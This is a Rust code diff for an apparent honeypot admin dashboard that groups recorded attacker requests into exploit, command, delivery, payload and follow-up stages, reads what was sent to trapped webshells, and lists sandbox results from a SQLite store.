+        if let Some(inner) = rest.strip_prefix("try[") {
+            open.push(RecipeGroup::default());
+            rest = inner;
+        } else if let Some(after) = rest.strip_prefix(']') {
+            rest = after;
+            let Some(mut group) = open.pop() else {
+                continue;
+            };
+            match rest.strip_prefix(" else [") {
+                Some(inner) if group.tried.is_none() => {
+                    group.tried = Some(std::mem::take(&mut group.items));
+                    open.push(group);
+                    rest = inner;
+                }
+                _ => close(group, open.last_mut().map_or(&mut root, |g| &mut g.items)),
+            }
+        } else {
+            let end = [" → ", " | ", " ]"]
+                .iter()
+                .filter_map(|sep| rest.find(sep))
+                .min()
+                .unwrap_or(rest.len());
+            if let Some(word) = recipe_word(&rest[..end]) {
+                let into = open.last_mut().map_or(&mut root, |g| &mut g.items);
+                into.push(word.to_string());
+            }
+            rest = &rest[end..];
+        }
+    }
+    while let Some(group) = open.pop() {
+        close(group, open.last_mut().map_or(&mut root, |g| &mut g.items));
+    }
+    if root.is_empty() {
+        normal.to_string()
+    } else {
+        recipe_steps(&root)
+    }
+}
+
+fn row(label: String, detail: String, mark: Mark) -> StageRow {
+    StageRow {
+        piece: None,
+        label,
+        detail,
+        mark,
+        joiner: false,
+        here: false,
+        dim: false,
+        href: None,
+        requests: 0,
+    }
+}
+
+fn piece_row(p: &Found, detail: String, here: &Here) -> StageRow {
+    StageRow {
+        piece: Some(p.hash),
+        here: here.pieces.contains(&p.hash),
+        href: p.href(),
+        requests: p.sources,
+        ..row(label(&p.value), detail, p.mark())
+    }
+}
+
+/// An attacker's tag up to its first dot, so `cve_2024_4577.selfrep` reads
+/// with `cve_2024_4577`.
+fn tag_stem(tag: &str) -> &str {
+    tag.split('.')
+        .next()
+        .filter(|t| !t.is_empty())
+        .unwrap_or(tag)
+}
+
+/// The Exploit stage: a row per tag stem, listing the paths sent with it,
+/// then a row per exploit sent with no tag. `tags` holds an exploit's hash
+/// and a tag's, for each that shared a source.
+fn exploit_rows(found: &[Found], tags: &[(i64, i64)], here: &Here) -> Vec<StageRow> {
+    let by_role = |role: &'static str| {
+        let found = found.iter().filter(move |p| p.role == role);
+        found.map(|p| (p.hash, p)).collect::<BTreeMap<_, _>>()
+    };
+    let (exploits, tag_pieces) = (by_role("exploit"), by_role("tag"));
+    let mut stems: BTreeMap<&str, (Vec<&Found>, BTreeSet<&str>, bool)> = BTreeMap::new();
+    for p in tag_pieces.values() {
+        stems.entry(tag_stem(&p.value)).or_default().0.push(p);
+    }
+    let mut tagged = HashSet::new();
+    for (exploit, tag) in tags {
+        let (Some(e), Some(t)) = (exploits.get(exploit), tag_pieces.get(tag)) else {
+            continue;
+        };
+        tagged.insert(e.hash);
+        let stem = stems.entry(tag_stem(&t.value)).or_default();
+        stem.1.insert(&e.value);
+        stem.2 |= here.pieces.contains(&e.hash);
+    }
+    let mut rows = vec![];
+    for (stem, (mut tags, paths, used)) in stems {
+        tags.sort_by(|a, b| a.value.cmp(&b.value));
+        let mut listed: Vec<String> = paths.iter().take(ROW_PATHS_MAX).map(|p| label(p)).collect();
+        if paths.len() > ROW_PATHS_MAX {
+            listed.push(format!("{} more", paths.len() - ROW_PATHS_MAX));
+        }
+        let mut detail = "attacker's tag".to_string();
+        if !listed.is_empty() {
+            detail = format!("{detail} · {}", listed.join(", "));
+        }
+        let mut r = piece_row(tags[0], detail, here);
+        r.label = label(stem);
+        r.here = used || tags.iter().any(|t| here.pieces.contains(&t.hash));
+        r.requests = tags.iter().map(|t| t.sources).sum();
+        rows.push(r);
+    }
+    let bare = exploits.values().filter(|e| !tagged.contains(&e.hash));
+    rows.extend(bare.map(|e| piece_row(e, e.on_addresses("no tag"), here)));
+    rows
+}
+
+/// The Command stage: recipes, and what a webshell runs.
+fn command_rows(found: &[Found], here: &Here) -> Vec<StageRow> {
+    let recipes = found.iter().filter(|p| p.role == "recipe").map(|p| {
+        let what = match p.kind.as_str() {
+            "recipe" => "shell recipe",
+            _ => "webshell profile",
+        };
+        let mut r = piece_row(p, p.on_addresses(what), here);
+        if p.kind == "recipe" {
+            r.label = label(&compact_recipe(&p.value));
+        }
+        r
+    });
+    recipes.collect()
+}
+
+/// The Delivery stage: stagers, keys and uploaded files, by role only, so a
+/// URL that was merely queried stays out.
+fn delivery_rows(
+    key: Option<&str>,
+    found: &[Found],
+    uploads: &[UploadRow],
+    here: &Here,
+) -> Vec<StageRow> {
+    let mut rows = vec![];
+    for (role, what) in [
+        ("stager", "stager"),
+        ("key", "SSH key"),
+        ("file", "uploaded file"),
+    ] {
+        for p in found.iter().filter(|p| p.role == role) {
+            let name = uploads
+                .iter()
+                .find(|u| role == "file" && u.hash() == p.value);
+            let name = name.and_then(|u| u.filename.as_deref());
+            let mut r = piece_row(p, p.on_addresses(what), here);
+            r.joiner = key.is_some();
+            if let Some(name) = name {
+                r.label = label(name);
+            } else if role == "file" {
+                r.label = label(p.value.get(..12).unwrap_or(&p.value));
+            }
+            rows.push(r);
+        }
+    }
+    rows
+}
+
+/// The Payload stage: the uploaded text as seen, one row per content, else
+/// a gap that points to where a result is entered. Sandbox results belong
+/// here too: this is the one place that decides the stage.
+fn payload_rows(
+    found: &[Found],
+    uploads: &[UploadRow],
+    results: &[PieceResult],
+    here: &Here,
+) -> Vec<StageRow> {
+    let mut contents: BTreeMap<Vec<u8>, Vec<&UploadRow>> = BTreeMap::new();
+    for u in uploads.iter().filter(|u| u.held_text()) {
+        contents.entry(u.sha256.clone()).or_default().push(u);
+    }
+    let mut groups: Vec<_> = contents.into_values().collect();
+    groups.sort_by(|a, b| b[0].ts.cmp(&a[0].ts));
+    let rows: Vec<StageRow> = groups
+        .into_iter()
+        .map(|same| {
+            let u = same[0];
+            let name = u.filename.as_deref().unwrap_or(&u.answered_path);
+            let piece = found
+                .iter()
+                .find(|p| p.role == "file" && p.value == u.hash());
+            StageRow {
+                piece: piece.map(|p| p.hash),
+                requests: same.len() as i64,
+                here: same.iter().any(|u| here.uploads.contains(&u.uid))
+                    || piece.is_some_and(|p| here.pieces.contains(&p.hash)),
+                href: Some(format!(
+                    "/admin/traps/uploads/{}",
+                    crate::admin::public::urlencode(&u.uid)
+                )),
+                ..row(
+                    label(name),
+                    format!(
+                        "uploaded text · {} · {}",
+                        count(u.size, "byte", "bytes"),
+                        count(same.len() as i64, "upload", "uploads")
+                    ),
+                    Mark::Seen,
+                )
+            }
+        })
+        .collect();
+    let mut rows = rows;
+    rows.extend(results.iter().map(|r| result_row(r, found, here)));
+    if !rows.is_empty() {
+        return rows;
+    }
+    let stager = found.iter().find(|p| p.role == "stager");
+    let target = stager.or_else(|| found.iter().find(|p| p.role == "file"));
+    let detail = match target {
+        Some(_) => "Nothing here fetches it. A sandbox's result goes on this page.",
+        None => "No stager named and no text uploaded.",
+    };
+    vec![StageRow {
+        piece: target.map(|p| p.hash),
+        href: target.and_then(Found::href),
+        ..row("No payload seen".into(), detail.into(), Mark::Gap)
+    }]
+}
+
+/// An admin's sandbox result, as a row: external, not seen here.
+fn result_row(r: &PieceResult, found: &[Found], here: &Here) -> StageRow {
+    let name = match (&r.family, &r.sha256) {
+        (Some(f), _) => f.clone(),
+        (None, Some(h)) => format!("sha256 {}", h.get(..12).unwrap_or(h)),
+        _ => "sandbox result".to_string(),
+    };
+    let mut detail = String::from("external · sandbox result");
+    if r.family.is_some()
+        && let Some(h) = &r.sha256
+    {
+        detail.push_str(&format!(" · sha256 {}", h.get(..12).unwrap_or(h)));
+    }
+    let on = found.iter().find(|p| p.hash == r.piece);
+    StageRow {
+        piece: Some(r.piece),
+        here: here.pieces.contains(&r.piece),
+        href: on.and_then(Found::href),
+        ..row(label(&name), detail, Mark::External)
+    }
+}
+
+/// The results entered for the stagers and files of a chain, oldest first.
+async fn results_of(conn: &mut SqliteConnection, found: &[Found]) -> Result<Vec<PieceResult>> {
+    let hashes: BTreeSet<i64> = found
+        .iter()
+        .filter(|p| matches!(p.kind.as_str(), "stager" | "file"))
+        .map(|p| p.hash)
+        .collect();
+    if hashes.is_empty() {
+        return Ok(vec![]);
+    }
+    // Integers, so they go in the text.
+    let ids = hashes
+        .iter()
+        .map(i64::to_string)
+        .collect::<Vec<_>>()
+        .join(",");
+    Ok(sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT piece, id, sha256, family, source_url, note, added_by, added_at
+         FROM piece_results WHERE piece IN ({ids}) ORDER BY added_at, piece, id LIMIT ?"
+    )))
+    .bind(CHAIN_RESULTS_MAX)
+    .fetch_all(&mut *conn)
+    .await?)
+}
+
+/// One row per distinct `shown`, in order, with how often it came.
+fn request_rows(
+    requests: &[TimelineRow],
+    shown: impl Fn(&TimelineRow) -> String,
+    detail: impl Fn(&TimelineRow, i64) -> String,
+    mark: Mark,
+    here: &Here,
+) -> Vec<StageRow> {
+    let mut sent: Vec<(&TimelineRow, String, i64, bool)> = vec![];
+    let mut at = HashMap::new();
+    for r in requests {
+        let text = shown(r);
+        let i = *at
+            .entry((text.clone(), &r.method, &r.path))
+            .or_insert(sent.len());
+        if i == sent.len() {
+            sent.push((r, text, 0, false));
+        }
+        sent[i].2 += 1;
+        sent[i].3 |= here.requests.contains(&r.id);
+    }
+    let rows = sent.into_iter().map(|(r, text, n, used)| StageRow {
+        here: used,
+        requests: n,
+        href: Some(format!("/admin/requests/{}", r.id)),
+        ..row(text, detail(r, n), mark)
+    });
+    rows.collect()
+}
+
+/// What came after a chain's uploads.
+#[derive(Default)]
+struct FollowUps {
+    dead: Vec<TimelineRow>,
+    /// Read through the X-ray, in order, at most [`FOLLOW_READS_MAX`].
+    sent: Vec<TimelineRow>,
+    /// What each of `sent` runs, by id, where the X-ray could tell.
+    reads: HashMap<i64, String>,
+    /// Past `sent`: counted, not read.
+    unread: i64,
+}
+
+/// A follow-up as the X-ray reads it, with the inputs of the webshell it was
+/// sent to.
+struct Sent {
+    id: i64,
+    ip: String,
+    method: String,
+    path: String,
+    query: Option<String>,
+    body: Option<Vec<u8>>,
+    inputs: Vec<String>,
+}
+
+/// The inputs a webshell reads, from its profiles.
+fn shell_inputs<'a>(profiles: impl Iterator<Item = &'a str>) -> Vec<String> {
+    let lists = profiles.filter_map(|p| p.split(';').find_map(|f| f.strip_prefix("input=")));
+    let inputs: BTreeSet<&str> = lists.flat_map(|l| l.split(',')).collect();
+    inputs.into_iter().map(str::to_string).collect()
+}
+
+/// The inputs of the webshell in each of `uploads`, by upload: two shells of
+/// one chain can read the same field for different things.
+async fn inputs_of(
+    conn: &mut SqliteConnection,
+    uploads: &[UploadRow],
+) -> Result<HashMap<String, Vec<String>>> {
+    let marks = vec!["?"; uploads.len()].join(",");
+    let sql = format!(
+        "SELECT u.uid, p.value FROM uploads u
+         JOIN piece_sightings g ON g.source_kind = 'upload' AND g.source_id = u.id
+         JOIN pieces p ON p.hash = g.piece
+         WHERE u.uid IN ({marks}) AND p.kind = 'shell-profile'"
+    );
+    let mut q = sqlx::query_as::<_, (String, String)>(sqlx::AssertSqlSafe(sql));
+    for u in uploads {
+        q = q.bind(&u.uid);
+    }
+    let mut profiles: HashMap<String, Vec<String>> = HashMap::new();
+    for (uid, value) in q.fetch_all(&mut *conn).await? {
+        profiles.entry(uid).or_default().push(value);
+    }
+    let inputs = |values: Vec<String>| shell_inputs(values.iter().map(String::as_str));
+    Ok(profiles
+        .into_iter()
+        .map(|(uid, values)| (uid, inputs(values)))
+        .collect())
+}
+
+/// `bytes` as one line of text, if there is any.
+fn one_line(bytes: &[u8]) -> Option<String> {
+    let text = String::from_utf8_lossy(bytes);
+    let text = text.replace(char::is_control, " ");
+    Some(text.trim().to_string()).filter(|t| !t.is_empty())
+}
+
+/// What `r` hands the input a webshell reads, like `$_GET[cmd]` or
+/// `php://input`. Other inputs, such as a header, are not stored here.
+fn input_value(x: &Xray, r: &Sent, input: &str) -> Option<String> {
+    let body = r.body.as_deref().unwrap_or_default();
+    if input == "php://input" {
+        return one_line(body);
+    }
+    let (source, name) = input
+        .strip_prefix("$_")?
+        .strip_suffix(']')?
+        .split_once('[')?;
+    let field = |text: &[u8]| {
+        let fields = serde_urlencoded::from_bytes::<Vec<(String, String)>>(text);
+        let fields = fields.unwrap_or_default().into_iter();
+        fields
+            .filter(|(k, _)| k == name)
+            .find_map(|(_, v)| one_line(v.as_bytes()))
+    };
+    let query = r.query.as_deref().unwrap_or_default().as_bytes();
+    let from_query = || {
+        matches!(source, "GET" | "REQUEST")
+            .then(|| field(query))
+            .flatten()
+    };
+    let from_body = || {
+        let posted = matches!(source, "POST" | "REQUEST");
+        let part = || {
+            let parts = x
+                .layers
+                .iter()
+                .filter(|l| l.kind == LayerKind::MultipartField);
+            parts
+                .filter(|l| l.name.as_deref() == Some(name.as_bytes()))
+                .find_map(|l| one_line(&l.text))
+        };
+        posted.then(|| field(body).or_else(part)).flatten()
+    };
+    from_query().or_else(from_body)
+}
+
+/// What a follow-up runs: the literal command a shell's input received, or
+/// the recipe the X-ray found. A request holding a private key shows only
+/// its recipe, which has no literal text in it.
+fn read_sent(r: &Sent) -> Option<String> {
+    let x = parse(
+        Source::Request {
+            method: &r.method,
+            path: &r.path,
+            query: r.query.as_deref(),
+            body: r.body.as_deref(),
+            sender: Some(&r.ip),
+        },
+        Policy::embedded(),
+    );
+    let key = holds_key(&x);
+    let command = || r.inputs.iter().find_map(|i| input_value(&x, r, i));
+    let literal = if key { None } else { command() };
+    let recipe = || {
+        x.recipes
+            .iter()
+            .map(|l| compact_recipe(&l.normal))
+            .find(|n| !n.is_empty())
+    };
+    let withheld = || key.then(|| format!("{} [private key withheld]", r.method));
+    literal.or_else(recipe).or_else(withheld)
+}
+
+/// What came after these uploads, the first [`FOLLOW_READS_MAX`] follow-ups
+/// read through the X-ray off the async threads. A request that carried an
+/// upload is read without its body: that is upload content.
+async fn gather_follow_ups(
+    conn: &mut SqliteConnection,
+    uploads: &[UploadRow],
+) -> Result<FollowUps> {
+    let dead = dead_ends_for(conn, uploads).await?;
+    let stopped: HashSet<i64> = dead.iter().map(|r| r.id).collect();
+    let mut sent = follow_ups_of(conn, uploads).await?;
+    sent.retain(|r| !stopped.contains(&r.id));
+    let unread = sent.len().saturating_sub(FOLLOW_READS_MAX) as i64;
+    sent.truncate(FOLLOW_READS_MAX);
+    if sent.is_empty() {
+        return Ok(FollowUps {
+            dead,
+            ..FollowUps::default()
+        });
+    }
+    let ids = sent.iter().map(|r| r.id.to_string()).collect::<Vec<_>>();
+    let bodies: Vec<(i64, Option<Vec<u8>>)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT r.id, CASE WHEN EXISTS(SELECT 1 FROM uploads u WHERE u.request_uid = r.uid)
+                      THEN NULL ELSE r.body END
+         FROM requests r WHERE r.id IN ({})",
+        ids.join(",")
+    )))
+    .fetch_all(&mut *conn)
+    .await?;
+    let mut bodies: HashMap<i64, Option<Vec<u8>>> = bodies.into_iter().collect();
+    let inputs = inputs_of(conn, &uploads[..uploads.len().min(TIMELINE_UPLOADS)]).await?;
+    let requests: Vec<Sent> = sent
+        .iter()
+        .map(|r| Sent {
+            id: r.id,
+            ip: r.ip.clone(),
+            method: r.method.clone(),
+            path: r.path.clone(),
+            query: r.query.clone(),
+            body: bodies.remove(&r.id).flatten(),
+            inputs: inputs.get(&r.upload).cloned().unwrap_or_default(),
+        })
+        .collect();
+    let reads = tokio::task::spawn_blocking(move || {
+        let read = requests.iter().filter_map(|r| {
+            let text = read_sent(r)?;
+            Some((r.id, text))
+        });
+        read.collect::<HashMap<_, _>>()
+    })
+    .await?;
+    Ok(FollowUps {
+        dead,
+        sent,
+        reads,
+        unread,
+    })
+}
+
+/// The Follow-up stage: where the trap stopped the chain, what was sent to
+/// its files, read through the X-ray, or a gap.
+fn follow_up_rows(uploads: &[UploadRow], f: &FollowUps, here: &Here) -> Vec<StageRow> {
+    let target = |r: &TimelineRow| label(&masked(&format!("{} {}", r.method, r.path)));
+    let dead_end = |_: &TimelineRow, n: i64| {
+        let asked = count(n, "request", "requests");
+        format!("{asked}: 404 within {DEAD_END_SECS} seconds of the upload")
+    };
+    let shown = |r: &TimelineRow| match (f.reads.get(&r.id), &r.query) {
+        (Some(read), _) => label(read),
+        (None, Some(q)) => label(&format!("{} {}?{q}", r.method, r.path)),
+        (None, None) => label(&format!("{} {}", r.method, r.path)),
+    };
+    let sent = |r: &TimelineRow, n: i64| {
+        let asked = count(n, "request", "requests");
+        let mut detail = match (r.answer.as_deref(), r.status) {
+            (Some(answer), Some(status)) => format!("{asked} · {answer} {status}"),
+            (Some(answer), None) => format!("{asked} · {answer}"),
+            (None, Some(status)) => format!("{asked} · {status}"),
+            (None, None) => asked,
+        };
+        if f.reads.contains_key(&r.id) {
+            detail = format!("{detail} · {}", target(r));
+        }
+        detail
+    };
+    let mut rows = request_rows(&f.dead, target, dead_end, Mark::DeadEnd, here);
+    rows.extend(request_rows(&f.sent, shown, sent, Mark::Seen, here));
+    if f.unread > 0 {
+        let more = count(f.unread, "more request", "more requests");
+        rows.push(StageRow {
+            requests: f.unread,
+            href: uploads.first().map(|u| {
+                let uid = crate::admin::public::urlencode(&u.uid);
+                format!("/admin/traps/uploads/{uid}")
+            }),
+            ..row(
+                more,
+                "Not read here; the upload's timeline lists them.".into(),
+                Mark::Seen,
+            )
+        });
+    }
+    if rows.is_empty() {
+        let detail = if uploads.is_empty() {
+            "The commands never ran here."
+        } else {
+            "Nothing asked for the file."
+        };
+        rows.push(row("No follow-up".into(), detail.into(), Mark::Gap));
+    }
+    rows
+}
+
+/// What a chain's stages are built from.
+struct Parts<'a> {
+    key: Option<&'a str>,
+    found: &'a [Found],
+    tags: &'a [(i64, i64)],
+    uploads: &'a [UploadRow],
+    follow: &'a FollowUps,
+    results: &'a [PieceResult],
+}
+
+fn stages(p: &Parts<'_>, here: &Here) -> [Stage; 5] {
+    let mut stages = [
+        ("Exploit", exploit_rows(p.found, p.tags, here)),
+        ("Command", command_rows(p.found, here)),
+        ("Delivery", delivery_rows(p.key, p.found, p.uploads, here)),
+        ("Payload", payload_rows(p.found, p.uploads, p.results, here)),
+        ("Follow-up", follow_up_rows(p.uploads, p.follow, here)),
+    ]
+    .map(|(name, rows)| Stage { name, rows });
+    if here.dim {
+        for s in &mut stages {
+            if !s.rows.iter().any(|r| r.here) {
+                s.rows.iter_mut().for_each(|r| r.dim = true);
+            }
+        }
+    }
+    stages
+}
+
+/// These sources as a condition on `piece_sightings g`. Their ids are
+/// integers, so they go in the text and no bound runs out. A kind with none
+/// is left out: `IN ()` next to an `OR` makes SQLite scan the table.
+fn sources_in(sources: &[(u8, i64)]) -> String {
+    let of_kind = |kind: u8, name: &str| {
+        let ids: Vec<String> = sources
+            .iter()
+            .filter(|s| s.0 == kind)
+            .map(|s| s.1.to_string())
+            .collect();
+        (!ids.is_empty()).then(|| {
+            format!(
+                "(g.source_kind = '{name}' AND g.source_id IN ({}))",
+                ids.join(",")
+            )
+        })
+    };
+    let kinds = [of_kind(REQUEST, "request"), of_kind(UPLOAD, "upload")];
+    match kinds {
+        [Some(a), Some(b)] => format!("({a} OR {b})"),
+        [Some(one), None] | [None, Some(one)] => one,
+        [None, None] => "0".to_string(),
+    }
+}
+
+/// The newest chains with a joiner in a sighting `cond` picks. `campaign`
+/// binds a `?` in `cond`.
+async fn keys_where(
+    conn: &mut SqliteConnection,
+    cond: &str,
+    campaign: Option<&str>,
+    max: usize,
+) -> Result<Vec<String>> {
+    let sql = format!(
+        "SELECT c.key FROM piece_sightings g
+         JOIN chain_pieces m ON m.piece = g.piece
+         JOIN pieces p ON p.hash = g.piece
+         JOIN chains c ON c.key = m.chain
+         WHERE g.role IN {JOINER_ROLES} AND {cond}
+         GROUP BY c.key ORDER BY c.last_seen DESC, c.key LIMIT ?"
+    );
+    let mut q = sqlx::query_scalar(sqlx::AssertSqlSafe(sql));
+    if let Some(key) = campaign {
+        q = q.bind(key);
+    }
+    Ok(q.bind(max as i64).fetch_all(&mut *conn).await?)
+}
+
+/// A piece a chain shows, as stored.
+#[derive(sqlx::FromRow)]
+struct TopPiece {
+    hash: i64,
+    kind: String,
+    value: String,
+    ips: i64,
+    sources: i64,
+}
+
+/// The chain's newest sources, at most [`TAG_SOURCES_MAX`]: the newest of each
+/// of its joiners, newest joiner first, merged. A botnet's stager can have a
+/// million sources, and the index reads only these. A joiner too old to
+/// change the result is not read.
+async fn newest_sources(conn: &mut SqliteConnection, chain: &str) -> Result<Vec<(u8, i64)>> {
+    let joiners: Vec<(i64, String)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT p.hash, p.last_seen FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
+         WHERE m.chain = ? AND p.kind IN {JOINER_KINDS} ORDER BY p.last_seen DESC LIMIT ?"
+    )))
+    .bind(chain)
+    .bind(SOURCE_JOINERS_MAX)
+    .fetch_all(&mut *conn)
+    .await?;
+    let keep = TAG_SOURCES_MAX as usize;
+    let mut newest: HashMap<(u8, i64), String> = HashMap::new();
+    let mut oldest: Option<String> = None;
+    for (piece, last_seen) in joiners {
+        if oldest.as_ref().is_some_and(|o| &last_seen < o) {
+            break;
+        }
+        let rows: Vec<(String, i64, String)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+            "SELECT source_kind, source_id, ts FROM piece_sightings
+             INDEXED BY idx_sightings_piece_ts
+             WHERE piece = ? AND role IN {JOINER_ROLES} ORDER BY ts DESC LIMIT ?"
+        )))
+        .bind(piece)
+        .bind(TAG_SOURCES_MAX)
+        .fetch_all(&mut *conn)
+        .await?;
+        for (kind, id, ts) in rows {
+            let at = newest.entry(source_of(&kind, id)).or_default();
+            *at = ts.max(std::mem::take(at));
+        }
+        if newest.len() >= keep {
+            let mut times: Vec<&String> = newest.values().collect();
+            times.select_nth_unstable_by(keep - 1, |a, b| b.cmp(a));
+            let last = times[keep - 1].clone();
+            newest.retain(|_, ts| *ts >= last);
+            oldest = Some(last);
+        }
+    }
+    let mut sources: Vec<((u8, i64), String)> = newest.into_iter().collect();
+    sources.sort_by(|a, b| b.1.cmp(&a.1).then(a.0.cmp(&b.0)));
+    sources.truncate(keep);
+    Ok(sources.into_iter().map(|(source, _)| source).collect())
+}
+
+/// The roles of a piece in none of a chain's newest sources, and how far each
+/// is confirmed, from its own newest sightings. What it counts is the piece's
+/// own: how much of that is this chain's is past what a strip reads.
+async fn older_roles(
+    conn: &mut SqliteConnection,
+    t: &TopPiece,
+) -> Result<Vec<(String, i64, bool)>> {
+    let roles: Vec<(String, bool)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT role, MAX(grade = 'seen') FROM
+           (SELECT role, grade FROM piece_sightings INDEXED BY idx_sightings_piece_ts
+            WHERE piece = ? AND role IN {STRIP_ROLES} ORDER BY ts DESC LIMIT ?)
+         GROUP BY role"
+    )))
+    .bind(t.hash)
+    .bind(OLD_SIGHTINGS_MAX)
+    .fetch_all(&mut *conn)
+    .await?;
+    let n = t.sources.max(1);
+    Ok(roles.into_iter().map(|(r, seen)| (r, n, seen)).collect())
+}
+
+/// A chain from its key; `None` when nothing of it is left to show.
+async fn keyed(conn: &mut SqliteConnection, key: &str, here: &Here) -> Result<Option<Chain>> {
+    let row: Option<(String, String, i64, i64)> =
+        sqlx::query_as("SELECT first_seen, last_seen, ips, sources FROM chains WHERE key = ?")
+            .bind(key)
+            .fetch_optional(&mut *conn)
+            .await?;
+    let Some((first_seen, last_seen, ips, sources)) = row else {
+        return Ok(None);
+    };
+    // From `chain_pieces`, not from the sources: a source naming a joiner
+    // of another chain must not show it here. The key's joiner, then the
+    // other joiners, then what most addresses share.
+    let top: Vec<TopPiece> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT p.hash, p.kind, p.value, p.ips, p.sources
+         FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
+         WHERE m.chain = ?1
+         ORDER BY p.hash IS ?2 DESC, p.kind IN {JOINER_KINDS} DESC, p.ips DESC, p.value
+         LIMIT ?3"
+    )))
+    .bind(key)
+    .bind(key_piece(key))
+    .bind(FOUND_MAX as i64)
+    .fetch_all(&mut *conn)
+    .await?;
+    if top.is_empty() {
+        return Ok(None);
+    }
+    let shown = top.len() as i64;
+    let mut more = 0;
+    if shown >= FOUND_MAX as i64 {
+        let all: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM chain_pieces m JOIN pieces p ON p.hash = m.piece
+             WHERE m.chain = ?",
+        )
+        .bind(key)
+        .fetch_one(&mut *conn)
+        .await?;
+        more = all - shown;
+    }
+    let held = sources_in(&newest_sources(conn, key).await?);
+    let tags: Vec<(i64, i64)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT DISTINCT g.piece, t.piece FROM piece_sightings g
+         JOIN piece_sightings t ON t.source_kind = g.source_kind AND t.source_id = g.source_id
+         WHERE g.role = 'exploit' AND t.role = 'tag' AND {held}"
+    )))
+    .fetch_all(&mut *conn)
+    .await?;
+    // `pieces.sources` counts every source: a recipe many chains share would
+    // look as busy in each.
+    let counts: Vec<(i64, String, i64, bool)> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT g.piece, g.role, COUNT(*), MAX(g.grade = 'seen') FROM piece_sightings g
+         WHERE g.role IN {STRIP_ROLES} AND {held} GROUP BY g.piece, g.role"
+    )))
+    .fetch_all(&mut *conn)
+    .await?;
+    let mut roles: HashMap<i64, Vec<(String, i64, bool)>> = HashMap::new();
+    for (piece, role, n, seen) in counts {
+        roles.entry(piece).or_default().push((role, n, seen));
+    }
+    let mut found: Vec<Found> = vec![];
+    for t in top {
+        let read = match roles.remove(&t.hash) {
+            Some(read) => read,
+            None => older_roles(conn, &t).await?,
+        };
+        found.extend(read.into_iter().map(|(role, sources, seen)| Found {
+            hash: t.hash,
+            kind: t.kind.clone(),
+            value: t.value.clone(),
+            role,
+            seen,
+            ips: t.ips,
+            sources,
+        }));
+    }
+    if found.is_empty() {
+        return Ok(None);
+    }
+    found.sort_by(|a, b| a.value.cmp(&b.value));
+    let uploads = uploads_of(conn, key).await?;
+    let follow = gather_follow_ups(conn, &uploads).await?;
+    let results = results_of(conn, &found).await?;
+    let stages = stages(
+        &Parts {
+            key: Some(key),
+            found: &found,
+            tags: &tags,
+            uploads: &uploads,
+            follow: &follow,
+            results: &results,
+        },
+        here,
+    );
+    Ok(Some(Chain {
+        key: Some(key.to_string()),
+        stages,
+        ips,
+        sources,
+        first_seen,
+        last_seen,
+        more,
+    }))
+}
+
+#[derive(sqlx::FromRow)]
+struct SourceSighting {
+    source_kind: String,
+    source_id: i64,
+    ip_id: i64,
+    ts: String,
+    grade: String,
+    #[sqlx(flatten)]
+    piece: SourcePiece,
+}
+
+#[derive(sqlx::FromRow)]
+struct SourcePiece {
+    hash: i64,
+    kind: String,
+    value: String,
+    role: String,
+    ips: i64,
+}
+
+/// What these sources hold: their pieces, each exploit and tag that shared
+/// one, and the addresses, sources and times they span.
+async fn read_sources(
+    conn: &mut SqliteConnection,
+    sources: &[(u8, i64)],
+) -> Result<Option<(Vec<Found>, Vec<(i64, i64)>, Span)>> {
+    let rows: Vec<SourceSighting> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
+        "SELECT g.source_kind, g.source_id, g.ip_id, g.ts, g.grade,
+                p.hash, p.kind, p.value, g.role, p.ips
+         FROM piece_sightings g JOIN pieces p ON p.hash = g.piece
+         WHERE g.role IN {STRIP_ROLES} AND {}",
+        sources_in(sources)
+    )))
+    .fetch_all(&mut *conn)
+    .await?;
+    let (mut ips, mut held) = (HashSet::new(), HashSet::new());
+    let mut span = Span::default();
+    let mut found: BTreeMap<(String, i64, String), Found> = BTreeMap::new();
+    let (mut exploits, mut tags): (BTreeSet<_>, BTreeSet<_>) = Default::default();
+    for r in rows {
+        let source = source_of(&r.source_kind, r.source_id);
+        ips.insert(r.ip_id);
+        held.insert(source);
+        span.widen(&r.ts);
+        let p = r.piece;
+        match p.role.as_str() {
+            "exploit" => exploits.insert((source, p.hash)),
+            "tag" => tags.insert((source, p.hash)),
+            _ => false,
+        };
+        let seen = r.grade == "seen";
+        found
+            .entry((p.value.clone(), p.hash, p.role.clone()))
+            .and_modify(|f| {
+                f.seen |= seen;
+                f.sources += 1;
+            })
+            .or_insert(Found {
+                hash: p.hash,
+                kind: p.kind,
+                value: p.value,
+                role: p.role,
+                seen,
+                ips: p.ips,
+                sources: 1,
+            });
+    }
+    if found.is_empty() {
+        return Ok(None);
+    }
+    let shared = exploits.iter().flat_map(|(source, exploit)| {
+        let same = tags.iter().filter(move |(s, _)| s == source);
+        same.map(|(_, tag)| (*exploit, *tag))
+    });
+    let shared: BTreeSet<(i64, i64)> = shared.collect();
+    span.ips = ips.len() as i64;
+    span.sources = held.len() as i64;
+    let mut found: Vec<Found> = found.into_values().collect();
+    let joins = |p: &Found| matches!(p.role.as_str(), "stager" | "key" | "file");
+    found.sort_by_key(|p| (!joins(p), std::cmp::Reverse(p.ips)));
+    span.more = found.len().saturating_sub(FOUND_MAX) as i64;
+    found.truncate(FOUND_MAX);
+    found.sort_by(|a, b| a.value.cmp(&b.value));
+    Ok(Some((found, shared.into_iter().collect(), span)))
+}
+
+/// What a chain without a key covers.
+#[derive(Default)]
+struct Span {
+    ips: i64,
+    sources: i64,
+    first_seen: String,
+    last_seen: String,
+    more: i64,
+}
+
+impl Span {
+    fn widen(&mut self, ts: &str) {
+        if self.first_seen.is_empty() || ts < self.first_seen.as_str() {
+            self.first_seen = ts.to_string();
+        }
+        if ts > self.last_seen.as_str() {
+            self.last_seen = ts.to_string();
+        }
+    }
+}
+
+/// These sources as a chain of their own, without a key, if they hold
+/// anything a strip shows.
+async fn unkeyed(
+    conn: &mut SqliteConnection,
+    sources: &[(u8, i64)],
+    here: &Here,
